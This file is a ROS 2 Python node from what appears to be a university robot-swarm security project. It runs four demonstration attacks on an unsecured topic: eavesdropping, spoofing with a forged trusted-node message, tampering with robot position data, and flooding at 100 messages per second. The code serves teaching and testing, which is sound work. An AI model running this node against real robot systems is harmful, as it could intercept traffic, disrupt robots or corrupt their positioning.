#!/usr/bin/env python3
"""
attacker_node.py – Simulates the four threat categories analysed in Chapter 3.
  1. Eavesdropping  – passive listener on /robot_topic_unsecure
  2. Spoofing       – publish a forged message with a fake node identity
  3. Tampering      – intercept & modify message content
  4. Flooding       – burst of 100 msgs/s on the unsecure topic

⚠️  FOR EDUCATIONAL / DEMONSTRATION PURPOSES ONLY.
Team Secure Swarm – Université Ibn Tofail, Kénitra (2025-2026)
"""

import time
import rclpy
from rclpy.node import Node
from std_msgs.msg import String


class AttackerNode(Node):
    def __init__(self):
        super().__init__('attacker_node')

        # --- Eavesdropping ---
        self.eavesdrop_sub = self.create_subscription(
            String, 'robot_topic_unsecure', self._eavesdrop_cb, 10)

        # --- Spoofing & Tampering publisher ---
        self.spoof_pub = self.create_publisher(String, 'robot_topic_unsecure', 10)

        # --- Flooding timer (triggered on demand via parameter) ---
        self.declare_parameter('flood_mode', False)
        self.flood_mode = self.get_parameter('flood_mode').value
        if self.flood_mode:
            self.get_logger().warn('FLOOD MODE ACTIVATED – sending 100 msgs/s')
            self.flood_timer = self.create_timer(0.01, self._flood_cb)  # 100 Hz

        # --- One-shot spoofing & tampering ---
        self.create_timer(3.0, self._spoof_once)
        self.create_timer(5.0, self._tamper_once)

        self.get_logger().warn('AttackerNode launched – demonstration only!')

    # ------------------------------------------------------------------
    def _eavesdrop_cb(self, msg):
        self.get_logger().warn(f'[EAVESDROP] Intercepted: {msg.data}')

    def _spoof_once(self):
        msg = String()
        msg.data = '[SPOOFED] I am a trusted node – position: x=999, y=999'
        self.spoof_pub.publish(msg)
        self.get_logger().warn('[SPOOF] Forged message sent.')

    def _tamper_once(self):
        msg = String()
        msg.data = '[TAMPERED] Robot position: x=0, y=0, z=MALICIOUS_PAYLOAD'
        self.spoof_pub.publish(msg)
        self.get_logger().warn('[TAMPER] Tampered message sent.')

    def _flood_cb(self):
        msg = String()
        msg.data = f'[FLOOD] {time.time()}'
        self.spoof_pub.publish(msg)


def main(args=None):
    rclpy.init(args=args)
    node = AttackerNode()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
